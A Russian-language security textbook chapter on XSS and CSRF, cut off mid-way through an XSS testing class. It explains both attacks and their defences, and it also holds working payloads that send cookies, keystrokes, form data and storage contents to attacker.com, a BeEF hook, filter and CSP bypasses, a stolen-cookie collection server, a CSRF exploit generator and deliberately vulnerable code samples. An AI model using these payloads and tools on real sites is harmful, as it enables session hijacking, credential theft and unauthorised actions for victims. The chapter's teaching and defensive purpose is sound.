# Глава 11.2: XSS и CSRF: клиентские атаки

## Введение

XSS (Cross-Site Scripting) и CSRF (Cross-Site Request Forgery) — два наиболее распространённых класса атак на клиентскую сторону веб-приложений. По данным OWASP, они регулярно входят в топ-10 уязвимостей и остаются серьёзной угрозой, несмотря на широкую известность.

- **XSS** позволяет злоумышленнику выполнить произвольный JavaScript в браузере жертвы
- **CSRF** заставляет браузер жертвы отправить нежелательный HTTP-запрос от её имени

```
┌─────────────────────────────────────────────────────────────┐
│                    XSS vs CSRF                               │
│                                                              │
│  XSS: Сервер → (JS) → Браузер жертвы → Злоумышленник       │
│                                                              │
│  ┌──────────┐    вредоносный JS    ┌─────────────┐          │
│  │ Сервер   │──────────────────────►│ Браузер     │          │
│  │ (XSS)    │                      │ жертвы      │          │
│  └──────────┘                      └──────┬──────┘          │
│                                           │ куки/данные     │
│                                           ▼                  │
│                                    ┌──────────────┐         │
│                                    │ Злоумышленник│         │
│                                    └──────────────┘         │
│                                                              │
│  CSRF: Злоумышленник → (форма) → Браузер жертвы → Сервер   │
│                                                              │
│  ┌──────────────┐  evil.com/form  ┌─────────────┐          │
│  │Злоумышленник │────────────────►│ Браузер     │          │
│  └──────────────┘                 │ жертвы      │          │
│                                   └──────┬──────┘          │
│                                          │ легитимный куки  │
│                                          ▼                  │
│                                   ┌─────────────┐          │
│                                   │ Сервер      │          │
│                                   │ (target)    │          │
│                                   └─────────────┘          │
└─────────────────────────────────────────────────────────────┘
```

---

## 11.2.1 Типы XSS

### Reflected XSS (Отражённый)

Reflected XSS возникает, когда пользовательский ввод немедленно возвращается в ответе без надлежащей обработки.

```php
<?php
// УЯЗВИМЫЙ КОД: Отражённый XSS
$search = $_GET['q'];
echo "<p>Результаты поиска для: " . $search . "</p>";
// URL: http://target.com/search?q=<script>alert('XSS')</script>
?>
```

```html
<!-- Базовые XSS payloads -->

<!-- Простейший тест -->
<script>alert('XSS')</script>

<!-- Тест с обходом фильтров -->
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- Event handlers -->
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
<input autofocus onfocus="alert('XSS')">
<select autofocus onfocus="alert('XSS')">
<textarea autofocus onfocus="alert('XSS')">

<!-- Без скобок (для обхода фильтров) -->
<img src=x onerror=alert`XSS`>

<!-- JavaScript URI -->
<a href="javascript:alert('XSS')">click me</a>

<!-- Data URI -->
<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>

<!-- SVG -->
<svg><script>alert('XSS')</script></svg>
<svg><animate onbegin="alert('XSS')" attributeName="x" dur="1s">

<!-- Template injection lookalike -->
{{constructor.constructor('alert(1)')()}}

<!-- Bypass через encoding -->
&lt;script&gt; → <script> (HTML entities - должны декодироваться браузером)
\u003cscript\u003e (Unicode)
%3Cscript%3E (URL encoding)
```

### Stored XSS (Хранимый)

Хранимый XSS сохраняется в базе данных и выполняется при каждом просмотре страницы.

```php
<?php
// УЯЗВИМЫЙ КОД: Stored XSS в комментариях

// Сохранение комментария (без экранирования):
$comment = $_POST['comment'];
$db->query("INSERT INTO comments (text) VALUES ('$comment')");

// Отображение комментариев (без экранирования):
$comments = $db->query("SELECT text FROM comments");
foreach ($comments as $row) {
    echo "<div class='comment'>" . $row['text'] . "</div>";
    // Если в text хранится <script>...</script> → выполняется!
}
?>
```

```javascript
// Практические Stored XSS payloads

// 1. Кража куки и отправка на C2 сервер:
<script>
fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>

// 2. Кража куки через Image:
<img src=x onerror="new Image().src='https://attacker.com/steal?c='+document.cookie">

// 3. Кейлоггер (перехват нажатий клавиш):
<script>
document.addEventListener('keydown', function(e) {
    fetch('https://attacker.com/keylog', {
        method: 'POST',
        body: JSON.stringify({key: e.key, page: location.href, time: Date.now()})
    });
});
</script>

// 4. Форм-грабер (перехват форм):
<script>
document.querySelectorAll('form').forEach(form => {
    form.addEventListener('submit', e => {
        const data = new FormData(form);
        const json = {};
        data.forEach((v, k) => json[k] = v);
        
        fetch('https://attacker.com/formgrab', {
            method: 'POST',
            body: JSON.stringify({url: location.href, data: json})
        });
    });
});
</script>

// 5. Захват сессии (если куки не HttpOnly):
<script>
// Загрузка произвольного скрипта (BeEF hook):
var s = document.createElement('script');
s.src = 'http://attacker.com:3000/hook.js';
document.head.appendChild(s);
</script>

// 6. Перенаправление на фишинговый сайт:
<script>
setTimeout(function() {
    window.location = 'https://phishing.attacker.com/login?redir=' + 
        encodeURIComponent(location.href);
}, 3000);
</script>

// 7. Скрин браузера (через html2canvas или Canvas API):
<script>
import('https://html2canvas.hertzen.com/dist/html2canvas.min.js').then(m => {
    m.default(document.body).then(canvas => {
        fetch('https://attacker.com/screenshot', {
            method: 'POST',
            body: canvas.toDataURL()
        });
    });
});
</script>
```

### DOM-based XSS

```javascript
// DOM XSS возникает когда JavaScript на странице небезопасно
// использует данные из DOM (location, hash, referrer и т.д.)

// УЯЗВИМЫЙ КОД: читает из URL hash и вставляет в DOM
document.getElementById('message').innerHTML = location.hash.slice(1);
// URL: http://target.com/page#<img src=x onerror=alert(1)>

// УЯЗВИМЫЙ КОД: document.write из параметра
var name = new URLSearchParams(location.search).get('name');
document.write('<h1>Hello, ' + name + '!</h1>');
// URL: http://target.com/page?name=<script>alert(1)</script>

// УЯЗВИМЫЙ КОД: eval с пользовательскими данными
var cmd = location.hash.slice(1);
eval(cmd);  // НИКОГДА НЕ ДЕЛАЙТЕ ТАК!

// DOM XSS Sources (источники опасных данных):
// - document.URL / location.href
// - location.search / location.hash
// - document.referrer
// - window.name
// - localStorage / sessionStorage
// - document.cookie (при передаче в eval)
// - postMessage data

// DOM XSS Sinks (опасные функции):
// - innerHTML / outerHTML
// - document.write / document.writeln
// - eval()
// - setTimeout(str) / setInterval(str)
// - Function(str)()
// - location.href = (если присваивать пользовательские данные)
// - jQuery: $().html(), $().append()

// ПРАВИЛЬНЫЙ КОД: textContent вместо innerHTML
document.getElementById('message').textContent = location.hash.slice(1);

// ПРАВИЛЬНЫЙ КОД: DOMParser для безопасного создания элементов
const parser = new DOMParser();
const safeHtml = DOMPurify.sanitize(userInput);  // Используйте DOMPurify!
element.innerHTML = safeHtml;
```

---

## 11.2.2 Продвинутые XSS техники

### Обход фильтров и WAF

```javascript
// Обход фильтра на <script>:
<ScRiPt>alert(1)</sCrIpT>
<scr<script>ipt>alert(1)</scr</script>ipt>   // Двойная обфускация

// Обход фильтра на "javascript:":
<a href="&#106;avascript:alert(1)">click</a>  // HTML entity
<a href="jav&#x61;script:alert(1)">click</a>  // Hex entity
<a href="jav	ascript:alert(1)">click</a>   // TAB между буквами
<a href="jav ascript:alert(1)">click</a>      // Пробел (некоторые браузеры)

// Обход через unicode escapes в JS:
<script>\u0061lert(1)</script>
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

// Обход без кавычек:
<script>alert(/XSS/.source)</script>
<script>alert`XSS`</script>  // Template literals
<script>alert(1337)</script>

// Мультилайн обход:
<script>
al\
er\
t(1)
</script>

// Обход через атрибуты без кавычек:
<img src=x onerror=alert(1)>
<img src=x onerror=alert(1) />

// Обход HTML-энтити фильтра через CSS:
<style>
@import url("javascript:alert(1)");
</style>

// Обход через meta refresh:
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

// Обход Content-Type filter:
// Если сервер возвращает application/json — инъекция в JSONP:
callback=<script>alert(1)</script>

// Обход через RPO (Relative Path Overwrite):
// Манипуляция путём для загрузки чужих стилей

// XSS в SVG внутри HTML:
<svg>
  <foreignObject>
    <div xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(1)</script>
    </div>
  </foreignObject>
</svg>
```

### Продвинутая кража куки

```javascript
// Асинхронная кража через XMLHttpRequest:
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://attacker.com/?c=' + encodeURIComponent(document.cookie));
xhr.send();

// Через fetch (если CSP разрешает):
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: document.cookie,
    mode: 'no-cors'
});

// Кража куки через WebSocket (обход CSP):
var ws = new WebSocket('wss://attacker.com/ws');
ws.onopen = function() {
    ws.send(JSON.stringify({
        type: 'cookie',
        data: document.cookie,
        url: location.href,
        ua: navigator.userAgent
    }));
};

// Кража куки через DNS (если CSP строгий):
// Отправляем данные как поддомен в DNS lookup
var img = new Image();
img.src = 'http://' + 
    btoa(document.cookie).replace(/=/g,'').substring(0,63) + 
    '.attacker.com/x';

// Кража localStorage и sessionStorage:
var data = {
    cookies: document.cookie,
    local: JSON.stringify(localStorage),
    session: JSON.stringify(sessionStorage),
    url: location.href
};
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
});

// Совмещение XSS + CSRF (меняем email жертвы):
fetch('/api/user/email', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'attacker@evil.com'}),
    credentials: 'include'
}).then(r => r.json()).then(d => console.log(d));
```

---

## 11.2.3 BeEF Framework

BeEF (Browser Exploitation Framework) — это инструмент для тестирования безопасности браузеров через XSS-уязвимости.

```bash
# Установка BeEF:
git clone https://github.com/beefproject/beef.git
cd beef
./install

# Запуск:
./beef

# BeEF слушает на:
# - http://127.0.0.1:3000/ui/panel (панель управления)
# - http://127.0.0.1:3000/hook.js  (hook для браузеров)

# Учётные данные по умолчанию:
# beef / beef (измените в config.yaml!)
```

```javascript
// BeEF Hook - внедрите в уязвимую страницу через XSS:
<script src="http://attacker.com:3000/hook.js"></script>

// После подключения браузера жертвы доступны модули:

// 1. Получение информации о браузере:
// Network > Get Internal Network (определяет локальные IP)
// Browser > Get Cookies
// Browser > Get Local Storage

// 2. Социальная инженерия:
// Social Engineering > Fake Flash Update
// Social Engineering > Pretty Theft (поддельная форма логина)
// Social Engineering > Google Phishing

// 3. Сетевые атаки через браузер:
// Network > Fingerprint Network
// Network > Port Scanner (сканирование внутренней сети!)
// Network > Ping Sweep

// 4. Tunneling через браузер:
// Network > Create Tunnel Proxy
// (позволяет использовать браузер жертвы как прокси)

// BeEF REST API для автоматизации:
curl http://127.0.0.1:3000/api/hooks \
    -H "Content-Type: application/json" \
    --data '{"token": "API_TOKEN"}'

# Список подключённых браузеров:
curl "http://127.0.0.1:3000/api/hooks?token=API_TOKEN"

# Выполнение команды в браузере:
curl "http://127.0.0.1:3000/api/modules/hook_id/command_module_id" \
    -X POST \
    -H "Content-Type: application/json" \
    --data '{"token": "API_TOKEN"}'
```

### XSS Server (простой приёмник куки)

```python
#!/usr/bin/env python3
"""
Простой HTTP сервер для приёма украденных куки и данных
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import json
import datetime
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)


class XSSCatcher(BaseHTTPRequestHandler):
    """HTTP обработчик для приёма XSS данных"""
    
    def do_GET(self):
        """Обработка GET запросов (куки через параметр)"""
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        if parsed.path in ['/steal', '/cookie', '/c']:
            cookie = params.get('c', params.get('cookie', ['']))[0]
            victim_ip = self.client_address[0]
            
            self._log_theft({
                'timestamp': datetime.datetime.now().isoformat(),
                'victim_ip': victim_ip,
                'cookie': cookie,
                'user_agent': self.headers.get('User-Agent', ''),
                'referer': self.headers.get('Referer', '')
            })
        
        # Отправляем пустой ответ (или 1x1 пиксель)
        self.send_response(200)
        self.send_header('Content-Type', 'image/gif')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        # 1x1 прозрачный GIF
        self.wfile.write(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b')
    
    def do_POST(self):
        """Обработка POST запросов (расширенные данные)"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data)
        except json.JSONDecodeError:
            data = {'raw': post_data.decode('utf-8', errors='replace')}
        
        victim_ip = self.client_address[0]
        data['victim_ip'] = victim_ip
        data['timestamp'] = datetime.datetime.now().isoformat()
        data['user_agent'] = self.headers.get('User-Agent', '')
        
        self._log_theft(data)
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.end_headers()
        self.wfile.write(b'{"status": "received"}')
    
    def do_OPTIONS(self):
        """CORS preflight"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def _log_theft(self, data: dict):
        """Логирование украденных данных"""
        logger.info(f"\n{'='*60}")
        logger.info(f"[!] ПОЛУЧЕНЫ ДАННЫЕ!")
        for key, value in data.items():
            logger.info(f"  {key}: {value}")
        logger.info(f"{'='*60}")
        
        # Сохранение в файл
        with open('stolen_data.jsonl', 'a') as f:
            f.write(json.dumps(data, ensure_ascii=False) + '\n')
    
    def log_message(self, format, *args):
        """Отключаем стандартный лог"""
        pass


if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8888), XSSCatcher)
    logger.info("XSS Catcher запущен на порту 8888")
    server.serve_forever()
```

---

## 11.2.4 Content Security Policy (CSP)

CSP — это HTTP-заголовок, ограничивающий источники выполняемого контента.

```nginx
# Базовая CSP конфигурация (Nginx):
add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' 'nonce-RANDOM_NONCE';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data:;
    font-src 'self';
    connect-src 'self';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
";
```

```python
# Генерация nonce для CSP:
import secrets
import base64

def generate_csp_nonce() -> str:
    """Генерирует криптографически случайный nonce для CSP"""
    return base64.b64encode(secrets.token_bytes(16)).decode('utf-8')

# Использование в Flask:
from flask import Flask, make_response, render_template_string, g
import secrets, base64

app = Flask(__name__)

@app.before_request
def set_csp_nonce():
    g.csp_nonce = base64.b64encode(secrets.token_bytes(16)).decode('utf-8')

@app.after_request
def add_csp_header(response):
    nonce = g.get('csp_nonce', '')
    csp = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "
        f"style-src 'self' 'nonce-{nonce}'; "
        f"img-src 'self' data: https:; "
        f"connect-src 'self'; "
        f"frame-ancestors 'none'; "
        f"base-uri 'self'; "
        f"form-action 'self';"
    )
    response.headers['Content-Security-Policy'] = csp
    return response
```

### Обход CSP

```javascript
// 1. CSP bypass через JSONP (если разрешён внешний домен):
// CSP: script-src 'self' https://accounts.google.com
// JSONP endpoint: https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//"></script>

// 2. CSP bypass через Angular (если разрешён cdn.jsdelivr.net):
// CSP: script-src 'self' https://cdn.jsdelivr.net
<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script>
<div ng-app ng-csp>
  {{$eval.constructor('alert(1)')()}}
</div>

// 3. unsafe-inline bypass через нечёткое CSP:
// CSP: default-src 'self'; script-src 'unsafe-inline'
<script>alert(1)</script>  // Работает!

// 4. Bypass через iframe (если frame-ancestors не ограничен):
// Загружаем наш домен в iframe, наследующий более мягкий CSP

// 5. Bypass через base tag (если base-uri не ограничен):
// CSP: script-src 'self'
<base href="https://attacker.com/">
<!-- Теперь все относительные URL резолвятся на attacker.com -->
<script src="xss.js"></script>
<!-- Загружается https://attacker.com/xss.js -->

// 6. Bypass через open redirect:
// Если example.com в whitelist и имеет open redirect:
<script src="https://example.com/redirect?url=https://attacker.com/xss.js"></script>

// 7. DNS Rebinding bypass:
// Меняем DNS запись с example.com (whitelist) на attacker.com IP

// Проверка CSP на уязвимости:
// https://csp-evaluator.withgoogle.com/
```

---

## 11.2.5 CSRF: механика атаки

```html
<!-- CSRF атака: заставляем браузер жертвы выполнить действие -->

<!-- Пример 1: GET-запрос CSRF (изменение email) -->
<!-- Злоумышленник размещает на своём сайте: -->
<img src="https://target-bank.com/transfer?to=attacker&amount=10000" 
     style="display:none">

<!-- Пример 2: Автоматическая форма (POST CSRF) -->
<form id="csrf-form" 
      action="https://target.com/account/change-email" 
      method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="confirm" value="1">
</form>
<script>document.getElementById('csrf-form').submit();</script>

<!-- Пример 3: Fetch-based CSRF (если SameSite=None или не установлен) -->
<script>
fetch('https://target.com/api/user/password', {
    method: 'POST',
    credentials: 'include',  // Важно: включаем куки
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        new_password: 'hacked123',
        confirm_password: 'hacked123'
    })
});
</script>

<!-- Пример 4: CSRF через JSON Content-Type (через Flash или XMLHttpRequest) -->
<!-- Если сервер принимает text/plain вместо application/json: -->
<form action="https://target.com/api/account" 
      method="POST" 
      enctype="text/plain">
    <!-- trick: name содержит начало JSON, value - конец -->
    <input type="hidden" name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>

<!-- Пример 5: CSRF для смены привилегий -->
<img src="https://admin.target.com/users/1/promote?role=admin&user_id=999">
```

### Практический CSRF-эксплоит

```python
#!/usr/bin/env python3
"""
Генератор CSRF-эксплоита для тестирования
"""

from typing import Optional
import urllib.parse

def generate_csrf_exploit(
    target_url: str,
    method: str = 'POST',
    params: Optional[dict] = None,
    json_body: Optional[dict] = None,
    auto_submit: bool = True
) -> str:
    """
    Генерация HTML страницы с CSRF атакой
    
    Args:
        target_url: URL целевого действия
        method: HTTP метод (GET/POST)
        params: Параметры формы
        json_body: JSON тело (для fetch-based CSRF)
        auto_submit: Авто-отправка без взаимодействия пользователя
    """
    
    if method.upper() == 'GET':
        query = urllib.parse.urlencode(params or {})
        url = f"{target_url}?{query}" if query else target_url
        return f"""<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
    <img src="{url}" style="display:none" width="0" height="0">
    <p>Page is loading, please wait...</p>
</body>
</html>"""
    
    elif method.upper() == 'POST' and json_body is None:
        # Обычная HTML форма
        import json
        inputs = ''
        for key, value in (params or {}).items():
            inputs += f'    <input type="hidden" name="{key}" value="{value}">\n'
        
        submit = '<script>document.getElementById("csrf").submit();</script>' if auto_submit else \
                 '<input type="submit" value="Submit">'
        
        return f"""<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<form id="csrf" action="{target_url}" method="POST">
{inputs}    <input type="submit" value="Click here" style="display:{'none' if auto_submit else 'block'}">
</form>
{submit}
</body>
</html>"""
    
    elif json_body is not None:
        # Fetch-based CSRF
        import json as json_module
        body = json_module.dumps(json_body)
        
        return f"""<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<script>
fetch('{target_url}', {{
    method: 'POST',
    credentials: 'include',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({body})
}}).then(r => {{
    console.log('Status:', r.status);
    return r.text();
}}).then(t => console.log('Response:', t));
</script>
<p>Please wait...</p>
</body>
</html>"""


# Примеры генерации эксплоитов:
if __name__ == '__main__':
    # GET CSRF (transfer money)
    get_exploit = generate_csrf_exploit(
        target_url="https://bank.example.com/transfer",
        method='GET',
        params={'to': 'attacker', 'amount': '10000'}
    )
    
    # POST CSRF (change email)
    post_exploit = generate_csrf_exploit(
        target_url="https://target.com/account/email",
        method='POST',
        params={'email': 'attacker@evil.com', 'confirm': 'yes'}
    )
    
    # JSON CSRF (API endpoint)
    json_exploit = generate_csrf_exploit(
        target_url="https://api.target.com/user/password",
        method='POST',
        json_body={'new_password': 'hacked', 'confirm': 'hacked'}
    )
    
    with open('csrf_exploit.html', 'w') as f:
        f.write(json_exploit)
    
    print("[+] CSRF эксплоит создан: csrf_exploit.html")
```

---

## 11.2.6 CSRF-токены: защита и обход

```php
<?php
// ПРАВИЛЬНАЯ реализация CSRF токена:

// Генерация токена при загрузке формы:
session_start();

function generateCSRFToken(): string {
    $token = bin2hex(random_bytes(32));
    $_SESSION['csrf_token'] = $token;
    $_SESSION['csrf_token_time'] = time();
    return $token;
}

function validateCSRFToken(string $token): bool {
    // Проверка существования
    if (!isset($_SESSION['csrf_token'])) {
        return false;
    }
    
    // Проверка времени (токен действителен 1 час)
    if (time() - $_SESSION['csrf_token_time'] > 3600) {
        unset($_SESSION['csrf_token']);
        return false;
    }
    
    // Константное сравнение (защита от timing attacks)
    $valid = hash_equals($_SESSION['csrf_token'], $token);
    
    // Токен одноразовый — удаляем после проверки
    unset($_SESSION['csrf_token']);
    
    return $valid;
}

// В HTML форме:
$token = generateCSRFToken();
?>
<form method="POST" action="/change-email">
    <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($token) ?>">
    <input type="email" name="email">
    <button type="submit">Изменить email</button>
</form>

<?php
// При обработке формы:
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $submitted_token = $_POST['csrf_token'] ?? '';
    
    if (!validateCSRFToken($submitted_token)) {
        http_response_code(403);
        die('CSRF token validation failed');
    }
    
    // Продолжаем обработку...
}
?>
```

### Слабые реализации CSRF-токенов

```python
# УЯЗВИМЫЕ реализации CSRF-токенов:

# 1. Предсказуемый токен (timestamp):
import time
token = str(int(time.time()))  # ПЛОХО! Легко угадать

# 2. Токен на основе сессии (можно переиспользовать):
import hashlib
token = hashlib.md5(session_id.encode()).hexdigest()  # ПЛОХО!
# Если сессия известна — токен вычислим

# 3. Токен отправляется в URL:
# https://target.com/action?csrf=TOKEN
# → Попадает в Referer заголовок при редиректе!

# 4. Токен валидируется только на длину:
def validate_token(token):
    return len(token) == 32  # ПЛОХО! Любой 32-символьный токен пройдёт

# 5. Токен не привязан к сессии:
GLOBAL_TOKEN = "fixed_token_12345"  # ПЛОХО!

# ОБХОД слабых реализаций:
# - Если токен в Cookie → SameSite=None + CORS bypass
# - Если токен в URL → перехватить через Referer
# - Если токен предсказуем → вычислить

# ПРАВИЛЬНАЯ реализация:
import secrets
import time
import hmac
import hashlib

SECRET_KEY = secrets.token_bytes(32)

def generate_csrf_token(session_id: str) -> str:
    """Токен, криптографически связанный с сессией"""
    timestamp = str(int(time.time()))
    message = f"{session_id}:{timestamp}"
    signature = hmac.new(SECRET_KEY, message.encode(), hashlib.sha256).hexdigest()
    return f"{timestamp}:{signature}"

def validate_csrf_token(token: str, session_id: str, max_age: int = 3600) -> bool:
    """Валидация токена"""
    try:
        timestamp_str, signature = token.split(':', 1)
        timestamp = int(timestamp_str)
        
        # Проверка возраста
        if time.time() - timestamp > max_age:
            return False
        
        # Вычисляем ожидаемую подпись
        message = f"{session_id}:{timestamp_str}"
        expected_sig = hmac.new(SECRET_KEY, message.encode(), hashlib.sha256).hexdigest()
        
        # Константное сравнение
        return hmac.compare_digest(signature, expected_sig)
    
    except (ValueError, AttributeError):
        return False
```

---

## 11.2.7 SameSite Cookies

```http
# SameSite защита от CSRF:

# Strict: куки не отправляются при любых cross-site запросах
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly

# Lax: куки отправляются только при safe методах (GET) и top-level navigation
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly

# None: куки всегда отправляются (требует Secure)
Set-Cookie: session=abc123; SameSite=None; Secure; HttpOnly
```

```python
# Flask: правильная настройка куки сессии:
from flask import Flask

app = Flask(__name__)
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',    # Или 'Strict' для максимальной защиты
    SESSION_COOKIE_SECURE=True,        # Только HTTPS
    SESSION_COOKIE_HTTPONLY=True,      # Недоступен для JavaScript
    SESSION_COOKIE_NAME='__Secure-session',  # Prefix для дополнительной защиты
    PERMANENT_SESSION_LIFETIME=3600,   # 1 час
)

# Django: настройки безопасности куки:
"""
# settings.py
SESSION_COOKIE_SAMESITE = 'Lax'
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_AGE = 3600
CSRF_COOKIE_SAMESITE = 'Strict'
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_HTTPONLY = True
"""
```

### Обходы SameSite

```javascript
// SameSite=Lax обходы:

// 1. Subdomains: если attacker.example.com может установить куки для example.com
// (не совсем обход SameSite, но обход изоляции домена)

// 2. SameSite=Lax + POST через навигацию верхнего уровня (ограниченный обход):
// Только GET запросы работают при top-level navigation
// POST через form submit с target="_blank" иногда проходит в старых браузерах

// 3. Обход через XSS на том же домене:
// XSS + CSRF = полный контроль, т.к. XSS on same origin
// Если есть XSS на target.com → SameSite не защищает

// 4. SameSite=None (принудительный):
// Если куки установлен с SameSite=None → CSRF работает
// Проверяйте настройки третьесторонних SDK/плагинов

// 5. CORS misconfiguration bypass:
// Если Access-Control-Allow-Origin: * + credentials → OOB данные
fetch('https://target.com/api/user', {
    credentials: 'include'
});
// Браузер блокирует * + credentials, но неправильный CORS может разрешить
```

---

## 11.2.8 Защита от XSS

### Output Encoding

```php
<?php
// PHP: всегда экранируйте вывод!

// htmlspecialchars для HTML контекста:
$user_input = '<script>alert("XSS")</script>';
echo htmlspecialchars($user_input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
// Вывод: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

// НЕ используйте htmlspecialchars без флагов:
echo htmlspecialchars($user_input);  // ENT_COMPAT по умолчанию, не экранирует одинарные кавычки

// Для атрибутов HTML:
$attr_value = '" onmouseover="alert(1)';
echo '<input value="' . htmlspecialchars($attr_value, ENT_QUOTES) . '">';

// Для JavaScript контекста (никогда не вставляйте пользовательский ввод в JS!):
$js_value = json_encode($user_input, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_AMP | JSON_HEX_QUOT);
echo "<script>var userInput = $js_value;</script>";

// Для URL:
$url_param = urlencode($user_input);

// Для CSS:
// НИКОГДА не вставляйте пользовательский ввод в CSS без whitelist-валидации
?>
```

```python
# Python/Jinja2: авто-экранирование
from jinja2 import Environment, select_autoescape

env = Environment(
    autoescape=select_autoescape(['html', 'xml'])  # Включено!
)

# В Django шаблонах авто-экранирование включено по умолчанию:
# {{ user_input }}  → экранируется автоматически
# {{ user_input|safe }}  → ОПАСНО! Отключает экранирование

# Python: markupsafe для ручного экранирования:
from markupsafe import escape, Markup

safe_output = escape(user_input)  # Безопасно вставить в HTML

# DOMPurify для клиентской стороны:
```

```html
<!-- DOMPurify: очистка HTML на клиентской стороне -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.5/purify.min.js"></script>
<script>
// Использование DOMPurify:
const dirty = '<img src=x onerror="alert(1)">Hello <b>World</b>';
const clean = DOMPurify.sanitize(dirty);
// Результат: Hello <b>World</b> (тег img с onerror удалён)

document.getElementById('content').innerHTML = DOMPurify.sanitize(userInput);

// Строгая конфигурация DOMPurify:
const clean = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'class'],
    ALLOW_DATA_ATTR: false
});
</script>
```

### Security Headers

```nginx
# Полный набор security headers:

# XSS Protection (устаревший, но некоторые браузеры поддерживают):
add_header X-XSS-Protection "1; mode=block" always;

# Запрет MIME sniffing:
add_header X-Content-Type-Options "nosniff" always;

# Clickjacking защита:
add_header X-Frame-Options "DENY" always;
# или SAMEORIGIN для разрешения фреймов того же домена

# Content Security Policy:
add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' 'nonce-$request_id';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.yourdomain.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
    upgrade-insecure-requests;
" always;

# HSTS:
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

# Referrer Policy:
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# Permissions Policy:
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
```

---

## 11.2.9 Автоматизация тестирования XSS

```python
#!/usr/bin/env python3
"""
Автоматизированный тестировщик XSS
"""

import requests
from typing import List, Tuple, Optional
import re
import html

class XSSTester:
    """Автоматизированный тестировщик XSS уязвимостей"""
    
    PAYLOADS = [
        # Базовые
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        
        # Обход фильтров
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script>alert(String.fromCharCode(49))</script>",
        "javascript:alert(1)",
        
        # Без скобок
        "<img src=x onerror=alert`1`>",
        
        # Event handlers
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        
        # Encoding
        "%3Cscript%3Ealert%281%29%3C/script%3E",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    ]
    
    # Маркер для поиска в ответе
    MARKER = "XSS_TEST_MARKER_12345"
    
    def __init__(self, base_url: str, session: Optional[requests.Session] = None):
        self.base_url = base_url
        self.session = session or requests.Session()
        self.findings = []
    
    def test_parameter(
        self, 
        url: str, 
        param: str, 
        method: str = 'GET',
        base_params: Optional[dict] = None
    ) -> List[Tuple[str, str]]:
        """
        Тестирование конкретного параметра на XSS
        
        Returns:
            Список (payload, контекст) для найденных уязвимостей
        """
        vulnerabilities = []
        
        for payload in self.PAYLOADS:
            test_params = dict(base_params or {})
            test_params[param] = payload
            
            try:
                if method.upper() == 'GET':
                    response = self.session.get(url, params=test_params, timeout=10)
                else:
